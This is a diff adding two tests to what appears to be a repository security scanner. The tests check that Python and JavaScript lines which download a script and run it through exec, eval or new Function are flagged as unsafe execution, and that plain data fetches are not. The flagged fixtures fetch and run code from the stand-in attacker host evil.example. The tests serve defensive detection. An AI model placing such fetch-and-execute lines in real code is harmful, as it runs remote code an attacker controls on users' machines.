@@ -257,3 +257,87 @@ test("a download piped to an interpreter that reads no program from it keeps no 
     }).toEqual({ body, findings: [] });
   }
 });
+
+test("code fetched from the network and executed in-process is unsafe execution", () => {
+  // No shell and no pipe: the payload arrives through the language's own
+  // HTTP client and runs through eval/exec, in any source file.
+  for (const [path, body] of [
+    [
+      "tools/run.py",
+      "import requests\nexec(requests.get('https://evil.example/x.py').text)\n",
+    ],
+    [
+      "tools/run.py",
+      "import urllib.request\nexec(urllib.request.urlopen('https://evil.example/x.py').read())\n",
+    ],
+    [
+      "tools/run.js",
+      "eval(await (await fetch('https://evil.example/x.js')).text());\n",
+    ],
+    [
+      "tools/run.js",
+      "const run = new Function(await (await fetch('https://evil.example/x.js')).text());\nrun();\n",
+    ],
+  ] as const) {
+    const inspection = inspectRepository({
+      files: [{ path, bytes: new TextEncoder().encode(body) }],
+    });
+    expect({
+      path,
+      body,
+      findings: inspection.findings.map(
+        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+      ),
+    }).toEqual({
+      path,
+      body,
+      findings: [`${path}:unsafe-execution:high`],
+    });
+  }
+});
+
+test("fetching data without executing it keeps no unsafe-execution finding", () => {
+  for (const [path, body] of [
+    [
+      "tools/run.js",
+      "const data = await (await fetch('https://example.com/data.json')).json();\nconsole.log(data);\n",
+    ],
+    [
+      "tools/run.py",
+      "import requests\nprint(requests.get('https://example.com/data.json').json())\n",
+    ],
+    // Executing a local file's text is a different act; no fetch appears
+    // in the expression.
+    ["tools/run.py", "exec(open('tools/local_plugin.py').read())\n"],
+    ["tools/run.js", "eval(fetch('https://example.com/data'));\n"],
+    ["tools/run.js", "eval(await fetch('https://example.com/data'));\n"],
+    ["tools/run.py", "exec(requests.get('https://example.com/data'))\n"],
+    [
+      "tools/run.py",
+      "exec(requests.get('https://example.com/data').status_code)\n",
+    ],
+    [
+      "tools/run.py",
+      "exec(open('local.py').read()); data = requests.get('https://example.com/data').json()\n",
+    ],
+    [
+      "tools/run.js",
+      "eval(localCode); const data = await fetch('https://example.com/data');\n",
+    ],
+    [
+      "tools/run.js",
+      "matcher.exec(await fetch('https://example.com/data'));\n",
+    ],
+  ] as const) {
+    const inspection = inspectRepository({
+      files: [{ path, bytes: new TextEncoder().encode(body) }],
+    });
+    expect({
+      path,
+      body,
+      findings: inspection.findings.map(
+        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
+      ),
+    }).toEqual({ path, body, findings: [] });
+  }
+});
